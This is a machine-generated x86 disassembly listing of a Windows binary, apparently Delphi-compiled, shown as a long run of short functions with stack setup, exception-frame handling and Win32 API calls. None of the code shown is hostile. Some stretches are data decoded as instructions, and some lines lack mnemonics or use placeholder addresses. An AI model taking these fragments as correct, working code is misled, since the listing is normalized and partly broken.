add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_43f448
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
hlt
sub_43f682
jmp sub_44c770
sub_43f689
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_43f881
jmp sub_44c770
sub_43f8e5
jmp sub_44c770
sub_43f904
jmp sub_44c770
sub_43f90b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_448f68
retn
sub_43f923
jmp sub_44c770
sub_43f9de
jmp sub_44c770
sub_43fa75
jmp sub_44c770
sub_43fa80
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ad8
call sub_44c7a8
pop ecx
pop ebp
retn
sub_43faa0
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_43fa80
pop ebp
retn
sub_43fab0
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_43fa80
pop ebp
retn
sub_43fc74
jmp sub_44c770
sub_43fc7b
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_44cae0
mov esp ebp
pop ebp
retn 0x10
sub_43fdf1
jmp sub_44c770
sub_43fdf8
mov esp ebp
pop ebp
retn
sub_43ff12
jmp sub_44c770
sub_43ff2f
jmp sub_44c770
sub_43ff36
mov esp ebp
pop ebp
retn
sub_44016d
jmp sub_44c770
sub_440174
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
sub_440228
jmp sub_44c770
sub_44022f
mov esp ebp
pop ebp
retn
sub_440386
jmp sub_44c4bc
sub_4403b2
jmp sub_44c4bc
sub_440452
jmp sub_44c4bc
sub_4404fa
jmp sub_44c4bc
sub_440685
jmp sub_44c4bc
sub_4406c7
jmp sub_44c770
sub_4406e9
jmp sub_44c770
sub_4406f7
in eax 0x5d
retn
sub_44075a
jmp sub_44c770
sub_440837
jmp sub_44c770
sub_44083e
pop ebx
mov esp ebp
pop ebp
retn
sub_440b30
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_43fb3c
pop ecx
pop ebp
retn
sub_440c9f
lea eax [ ebp - 0x8 ]
call sub_44cae0
retn
sub_440ca8
jmp sub_44c770
j_sub_440c9f
jmp sub_440c9f
sub_440caf
mov esp ebp
pop ebp
retn
sub_440cb4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_441ad8
mov eax [ rw-data ]
call sub_43fa80
pop ebp
retn
j_sub_44c5e8#3
jmp sub_44c5e8
j_sub_44c5e8#4
jmp sub_44c5e8
sub_440e78
add [ eax ] eax
add [ eax ] al
pop eax
push ebp
inc esp
add [ esi + ecx + 0x45890044 ] al
aam 0x8b
inc ebp
hlt
sub_440ec2
jmp sub_44c770
sub_440ec9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441152
jmp sub_44c770
sub_441159
mov esp ebp
pop ebp
retn
sub_4413f5
jmp sub_44c770
sub_4413fc
pop ebx
mov esp ebp
pop ebp
retn
sub_4416b0
jmp sub_44c770
j_sub_44c4bc#9
jmp sub_44c4bc
sub_441705
jmp sub_44c770
sub_44170c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44172e
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_44cb04
retn
sub_441727
jmp sub_44c770
sub_44172e
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_44c4bc#8
jmp sub_44c4bc
sub_4417ec
jmp sub_44c770
sub_4417f3
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4419a3
jmp sub_44c770
sub_4419aa
pop ecx
pop ecx
pop ebp
retn
sub_441c35
jmp sub_44c770
sub_441c3c
pop ecx
pop ecx
pop ebp
retn
sub_441c85
jmp sub_44c770
sub_441c8c
pop ecx
pop ecx
pop ebp
retn
sub_441d36
jmp sub_44c770
sub_441d3d
pop ebx
mov esp ebp
pop ebp
retn
sub_441dfb
jmp sub_44c770
sub_441e02
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_442030
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4420c0
pop ecx
pop ebp
retn
sub_442044
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4420c0
pop ecx
pop ebp
retn
sub_4420e0
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
pop ebp
retn
mov eax [ rw-data ]
push eax
call DestroyWindow
xor eax eax
mov [ rw-data ] eax
sub_442210
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x8
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4424d4
sub_4426b8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_4426cc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4426e0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_4426f8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_442730
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_44274c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esp ebp
pop ebp
retn
sub_442760
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_442778
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_442788
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x20 ] 0x40
pop ecx
pop ebp
retn
sub_44279c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x20 ] 0xffbf
pop ecx
pop ebp
retn
sub_4427b0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x20 ] 0xfffe
pop ecx
pop ebp
retn
sub_4427c4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4406fc
pop ecx
pop ecx
pop ebp
retn
sub_4428b4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_442c84
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov esp ebp
pop ebp
retn 0x4
sub_442d3c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_442e2c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x1
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_442e40
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
pop ecx
pop ebp
retn 0x8
sub_442f28
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
sub_442f40
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_442f50
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_4431e3
jmp sub_44c4bc
sub_4431e8
mov [ ebp - 0x4 ] 0x1
call sub_44c818
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
j_sub_44c4bc#7
jmp sub_44c4bc
sub_443264
mov [ ebp - 0x4 ] 0x80030103
call sub_44c818
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
j_sub_44c4bc#6
jmp sub_44c4bc
sub_4432ee
mov [ ebp - 0x4 ] 0x80030009
call sub_44c818
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
j_sub_44c4bc#5
jmp sub_44c4bc
sub_44335f
mov [ ebp - 0x4 ] 0x8000ffff
call sub_44c818
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_443531
jmp sub_44c770
sub_443542
jmp sub_44c4bc
sub_443547
mov [ ebp - 0x4 ] 0x8000ffff
call sub_44c818
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443570
lea eax [ ebp + 0xc ]
call sub_44e3d0
retn
sub_443569
jmp sub_44c770
sub_443570
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_44357c
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0x8
sub_443590
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x80030102
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0x4
sub_4435a4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x80030001
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0x18
sub_4435b8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x80030001
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0x18
sub_443650
jmp sub_44c4bc
sub_443655
mov [ ebp - 0x4 ] 0x8000ffff
call sub_44c818
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_4436f3
jmp sub_44c770
sub_4436fa
mov eax [ rw-data ]
call sub_44c070
mov esp ebp
pop ebp
retn
sub_443708
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43bbdc
pop ecx
pop ebp
retn
sub_4437c8
jmp sub_44c770
sub_4437cf
pop ebp
retn
sub_443923
jmp sub_44c770
sub_44392a
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_4440b9
jmp sub_44c770
sub_4440c0
pop ebp
retn
sub_4440c4
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jae r-xdata
pop ebp
retn
call sub_444024
sub_444425
jmp sub_44c770
sub_44442c
pop ebp
retn
sub_444430
push ebp
mov ebp esp
sub [ rw-data ] 0x1
jae r-xdata
pop ebp
retn
call sub_444144
sub_444469
jmp sub_44c770
sub_444470
pop ebp
retn
sub_444474
sub [ rw-data ] 0x1
retn
sub_4444a4
push ebp
mov ebp esp
push ecx
call GetTickCount
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn
sub_4444b8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
sub_4444d0
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_4444e0
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_4444fc
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_444709
jmp sub_44c770
sub_444710
pop ebp
retn
sub_444714
sub [ rw-data ] 0x1
retn
sub_444741
jmp sub_44c770
sub_444748
pop ebp
retn
sub_44474c
sub [ rw-data ] 0x1
retn
sub_444779
jmp sub_44c770
sub_444780
pop ebp
retn
sub_444784
sub [ rw-data ] 0x1
retn
sub_4447b1
jmp sub_44c770
sub_4447b8
pop ebp
retn
sub_4447bc
sub [ rw-data ] 0x1
retn
sub_444811
jmp sub_44c770
sub_444818
pop ebp
retn
sub_44481c
sub [ rw-data ] 0x1
retn
sub_444875
jmp sub_44c770
sub_44487c
pop ebp
retn
sub_444880
sub [ rw-data ] 0x1
retn
sub_444b3d
jmp sub_44c770
sub_444b44
pop ebp
retn
sub_444b48
sub [ rw-data ] 0x1
retn
sub_444d60
cmp [ ebp - 0x1a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_444efc
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_4454ef
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_4454ef
sub_4460b8
jmp sub_44c770
sub_4460bf
pop ebx
mov esp ebp
pop ebp
retn
sub_4465e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call CloseHandle
pop ecx
pop ebp
retn
sub_4467e8
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_446af8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_44daf8
pop ecx
pop ecx
pop ebp
retn
sub_446b14
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44cae0
pop ecx
pop ebp
retn
sub_446f05
push eax
lea eax [ ebp - 0x10 ]
call sub_44cae0
pop eax
retn
sub_447328
jmp sub_44c770
sub_44732f
mov esp ebp
pop ebp
retn
sub_4473f9
jmp sub_44c770
sub_447400
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_4474b8
jmp sub_44c770
sub_4474bf
mov esp ebp
pop ebp
retn
sub_44770b
jmp sub_44c770
sub_447712
mov esp ebp
pop ebp
retn
sub_4477b8
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_447aad
jmp sub_44c770
sub_447ab4
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_447b98
jmp sub_44c770
sub_447b9f
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_447bc4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c018
sub_447d0c
mov esp ebp
pop ebp
retn
sub_447db7
jmp sub_44c770
sub_447dbe
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_447dc8
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_44c7a8
sub_447dd5
retn
sub_4480f6
jmp sub_44c770
sub_4480fd
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4481f0
jmp sub_44c770
sub_4481f7
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_448216
add [ eax ] al
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_447978
mov eax 0x1
call sub_44cac8
sub_448301
jmp sub_44c770
sub_448308
pop ecx
pop ecx
pop ebp
retn
sub_448b6d
jmp sub_44c770
sub_448b74
mov esp ebp
pop ebp
retn
sub_448cb7
jmp sub_44c770
sub_448cbe
mov esp ebp
pop ebp
retn
sub_449027
jmp sub_44c770
sub_44902e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44904c
mov eax [ ebp - 0x14 ]
push eax
call SetErrorMode
retn
sub_449045
jmp sub_44c770
sub_44904c
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_4494cc
jmp sub_44c770
sub_4494d3
pop ebp
retn
sub_44960c
push [ eax ]
mov [ eax + 0x4 ] 0xd7b0
call CloseHandle
dec eax
jne r-xdata
call GetLastError
retn
retn
sub_449808
mov edx [ eax + 0x4 ]
cmp edx 0xd7b2
jne r-xdata
cmp edx 0xd7b1
je r-xdata
call [ eax + 0x1c ]
test eax eax
jne r-xdata
retn
mov eax 0x67
jmp sub_44bbb4
sub_44982d
mov edx [ eax + 0x4 ]
cmp edx 0xd7b2
jne r-xdata
cmp edx 0xd7b1
je r-xdata
call [ eax + 0x20 ]
test eax eax
jne r-xdata
retn
mov eax 0x67
jmp sub_44bbb4
sub_4499b4
push edx
inc edx
call sub_4499cb
pop edx
mov [ edx ] cl
retn
sub_4499bf
push edx
call sub_4499cb
pop edx
mov [ edx + ecx ] 0x0
retn
j_sub_449a4c#3
mov edx 0xd7b1
jmp sub_449a4c
j_sub_449a4c#2
mov edx 0xd7b2
jmp sub_449a4c
j_sub_449a4c
mov edx 0xd7b3
jmp sub_449a4c
sub_449b47
xor eax eax
retn
sub_449bb4
mov ecx 0x3
jmp sub_449a9c
sub_449bbe
push [ eax ]
mov [ eax + 0x4 ] 0xd7b0
call CloseHandle
dec eax
jne sub_44bbc4
retn
sub_449c78
xor ecx ecx
mov cl [ edx ]
inc edx
jmp sub_449bd4
sub_449c9f
mov edx rw-data
mov ecx 0x2
call sub_449bd4
jmp sub_44982d
sub_449d05
push edx
lea edx [ ecx - 0x1 ]
call sub_449c3f
mov edx esp
mov ecx 0x1
call sub_449bd4
pop edx
retn
j_sub_449d20
xor ecx ecx
jmp sub_449d20
sub_449d6c
mov ecx eax
mov eax 0x17
or edx 0xffffffff
jmp sub_449d7f
sub_449d78
mov ecx edx
or edx 0xffffffff
jmp sub_449d7f
sub_44a6e8
adc ah ah
inc esp
add [ esp ] bl
inc esp
add [ eax - 0x63ffbb3e ] ch
retn 0x44
sub_44a718
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_44ae7e
jmp sub_44c770
sub_44ae85
mov al [ rw-data ]
pop ebp
retn
sub_44af62
jmp sub_44c770
sub_44b030
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_44b624
retn
sub_44b610
jmp sub_44c770
sub_44b7b6
jmp sub_44c770
sub_44ba49
jmp sub_44c770
sub_44ba5c
test eax eax
je r-xdata
retn
call [ rw-data ]
or eax eax
je r-xdata
mov al 0x1
jmp sub_44bb50
sub_44badc
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov [ eax + 0x4 ] edx
mov edx [ rw-data ]
mov [ eax + 0x8 ] edx
retn
sub_44baf8
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov edx [ eax + 0x8 ]
mov [ rw-data ] edx
retn
sub_44bb44
call sub_401140
mov eax [ eax + 0x8 ]
retn
sub_44bb79

sub_44bb94
push eax
push edx
push ecx
call sub_401140
cmp [ eax + 0xc ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_44bb50
retn
sub_44bbb0
retn
sub_44bbc4
call GetLastError
jmp sub_44bbb4
sub_44bbce
retn
sub_44bbd0
call sub_401140
xor edx edx
mov ecx [ eax + 0xc ]
mov [ eax + 0xc ] edx
mov eax ecx
retn
sub_44bc28
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
retn
sub_44bc34
sub esp 0xc
fwait
fnstcw [ esp ]
fwait
fldcw [ rw-data ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_44bc69
retn
sub_44be7b
retn
sub_44bf59
jmp sub_44c770
sub_44bfac
fninit
fwait
fldcw [ rw-data ]
retn
sub_44bfb8
mov eax [ eax ]
retn
sub_44bfbc
push esi
push edi
mov edi edx
mov esi [ eax - 0x2c ]
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_44bff8
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_44c004
push eax
mov eax [ eax - 0x28 ]
call sub_44ba5c
mov edx eax
pop eax
jmp sub_44c07c
sub_44c015
retn
sub_44c040
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_44c370
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_44c060
call sub_44c3d0
test dl dl
jle r-xdata
retn
call sub_44c3c0
sub_44c070
test eax eax
je r-xdata
retn
mov ecx [ eax ]
mov dl 0x1
call [ ecx - 0x4 ]
sub_44c100
retn
sub_44c192
jmp sub_44c770
sub_44c199
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44c200
test eax eax
je r-xdata
retn
mov ecx eax
mov ecx [ ecx - 0x24 ]
test ecx ecx
jne r-xdata
mov ecx [ ecx ]
cmp ecx edx
je r-xdata
mov al 0xa
jmp sub_44bb50
sub_44c27c
jmp r-xdata
cmp eax edx
je r-xdata
mov al 0x1
retn
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov eax [ eax ]
retn
sub_44c290
mov eax [ eax - 0x3c ]
retn
sub_44c294
mov eax 0x8000ffff
retn
sub_44c29c
retn
sub_44c2a0
retn
sub_44c2a4
retn
j_sub_44c4bc#4
jmp sub_44c4bc
sub_44c39e
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_44c7c4
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_44c3c0
sub_44c3c0
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_44c3c8
push eax
mov edx [ eax ]
call [ edx - 0x1c ]
pop eax
retn
sub_44c3d0
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_44c3e0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call RaiseException
sub_44c4a0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call RaiseException
pop edx
sub_44c7c0
retn
sub_44c848
xor edx edx
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
add ecx 0x5
mov [ fs : edx ] eax
call ecx
retn 0xc
sub_44c85d
retn
j_sub_44c4bc#3
jmp sub_44c4bc
sub_44c9a7
retn
sub_44cac8
mov [ rw-data ] eax
jmp sub_44c9a8
sub_44cc88
push edx
mov edx esp
mov ecx 0x1
call sub_44cbc8
pop edx
retn
sub_44ccc4
retn
sub_44cd00
retn
sub_44cd04
xor ecx ecx
mov cl [ edx ]
inc edx
jmp sub_44cbc8
sub_44cd0e
retn
sub_44cd27
retn
sub_44cd28
xor ecx ecx
test edx edx
je r-xdata
jmp sub_44cbf8
mov ecx [ edx - 0x4 ]
shr ecx 0x1
sub_44cd38
retn
sub_44ce1f
retn
sub_44ce6c
retn
sub_44cf14
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
sub_44cf24
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_44cfa7
retn
sub_44d0b8
mov ecx [ eax ]
mov [ eax ] edx
test ecx ecx
je r-xdata
retn
push ecx
call SysFreeString
sub_44d1d0
xor ecx ecx
test edx edx
je r-xdata
jmp sub_44d128
mov ecx [ edx - 0x4 ]
sub_44d1de
retn
sub_44d1e0
test eax eax
je r-xdata
retn
mov eax [ eax - 0x4 ]
shr eax 0x1
sub_44d1ec
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_44bb50
sub_44d308
mov ecx 0x1
jmp sub_44d274
sub_44d312
retn
sub_44d428
mov ecx 0x1
jmp sub_44d340
sub_44d432
retn
sub_44d642
retn
sub_44d644
push edx
call sub_44ba5c
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_44d308
pop eax
sub_44d658
push eax
call sub_44d428
pop eax
call sub_44ba74
retn
sub_44d82e
mov ecx [ edx ]
mov [ eax ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
retn
sub_44d8e8
jmp sub_44c770
sub_44d8ef
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44da7d
jmp sub_44c770
sub_44dae2
jmp sub_44c770
sub_44dbb0
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_44d7f0
add esp 0x10
sub_44dbd4
test eax eax
je r-xdata
retn
mov eax [ eax - 0x4 ]
sub_44dbdc
call sub_44dbd4
dec eax
retn
sub_44dbe4
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_44d550
pop ebp
retn 0x4
j_sub_44d340
jmp sub_44d340
sub_44dbf9
retn
sub_44dbfc
call sub_44dd9c
retn
sub_44dd90
push esp
add [ esp ] 0x4
call sub_44dc04
retn
sub_44de28
call sub_44de00
retn
sub_44e0dc
jmp sub_44c770
sub_44e20c
call sub_44e21c
retn
sub_44e214
call sub_44e23c
retn
sub_44e21c
push ebx
mov ebx eax
mov eax 0x8
call sub_44ba5c
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
j_sub_44c4bc#2
jmp sub_44c4bc
sub_44e2f8
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_44e36c
jmp sub_44c770
sub_44e373
pop ecx
pop ebp
retn
sub_44e3d0
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
push eax
push edx
mov eax [ edx ]
call [ eax + 0x8 ]
pop eax
sub_44e404
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_44e410
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_44e41c
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_44bb50
sub_44e42c
call sub_44c004
mov [ eax + 0x4 ] 0x1
retn
sub_44e464
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_44e5ae
jmp sub_44c770
sub_44e5b5
pop ebp
retn
sub_44e6a0
jmp sub_44c770
sub_44e6a7
pop ebp
retn
sub_44e6dc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_44ebe4
pop ecx
pop ebp
retn
sub_44e6ec
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_44e6dc
pop ecx
pop ebp
retn
sub_44e6fc
push ebp
mov ebp esp
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ rw-data ] edx
pop ebp
retn
sub_44e8a4
push ebp
mov ebp esp
mov eax [ rw-data ]
pop ebp
retn
sub_44e8b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_44e710
pop ecx
pop ebp
retn
